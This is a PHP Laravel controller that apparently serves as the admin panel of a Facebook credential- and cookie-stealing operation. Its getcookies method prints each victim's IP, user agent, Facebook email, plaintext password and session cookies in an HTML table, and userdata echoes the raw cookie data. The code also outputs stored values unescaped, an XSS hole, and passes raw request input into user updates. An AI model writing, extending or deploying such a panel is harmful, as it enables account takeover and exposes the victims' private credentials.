<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Cookies;
use App\User;
class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
       $data = User::with('cookies')->where('is_admin', '!=', '1')->get()->toArray(); 

 

      
         return view('home',compact('data'));
    }

  





     public function userdata(Request $request)
    {
        $data = Cookies::where('user_id' , $request['id'])->first();

    if( !empty($data['cookis_data']))
        $cookie = $data['cookis_data'];
     {      

     echo $json = $data['cookis_data'];
    }

    }    

   public function delete($id)
   {
        Cookies::where('id' , $id)->delete();
        return redirect()->back();
   }

   public function users()
   {
    $data = User::where('is_admin', '!=', '1')->get()->toArray();

   // echo "<pre>"; print_r($data ); die();
    return view('admin.user.index',compact('data'));
   }

   public function edit($id)
   {
      $data = User::where('id' , $id)->first();
       return view('admin.user.edit',compact('data'));
   }

      public function update(Request $request,$id)
   {
   // echo "<pre>"; print_r($request->all()); die();

    if($request['status'] == 0 or $request['status'] == 2 or $request['status'] == 3)
    {
      $request['live'] = '0';
    }elseif($request['status'] == 1)
    {
          $request['live'] = '1';
    }

      $data = User::where('id' , $id)->update($request->except(['_token']));

      return redirect()->back();
       
   }

   


   public function deleteuser($id)
   {
        User::where('id' , $id)->delete();
        return redirect()->back();
   }




public function getcookies(Request $reqeust, $id)
{

   $data = Cookies::where('user_id' , $id)->first();

   if(!empty($data))
   {  
   ?>

    <div class="box-body">
            <table id="example2" class="table table-bordered table-striped" >
                     <thead>

                       <tr>             
                    
                      
                       <th>IP</th>
                       <th>User Agent</th>
                       <th>FB User </th>
                       <th>FB Password</th>
                       <th>Cookies</th>                      
                       
                       <th></th>
                      
                       
                     
                     </tr>
                     </thead>
                     <tbody>        

                      <?php if($data) {?>
                        <tr>                                       
                 
                       <td><?php echo $data['ip']; ?></td>                       
                       <td><?php echo $data['user_agent'] ;?></td>
                       <td><?php echo $data['email'];?></td>
                       <td><?php echo $data['password'];?></td>

                    

                        <td style="word-break: break-all;"><?php echo $data['cookis_data'];?></td>
                     
                       <td><a href="<?php echo url('/delete'.'/'.$data['id']); ?>" class="btn btn-info btn-lg">Delete</a></td>



                        
                      </tr> 
                    <?php } else {?>
                       
                         

                     <?php }?>
                       
                     </tbody>
                 
                   </table>
                  </div>
   <?php
 }else{


 }

}

 



       
         
  
}
?>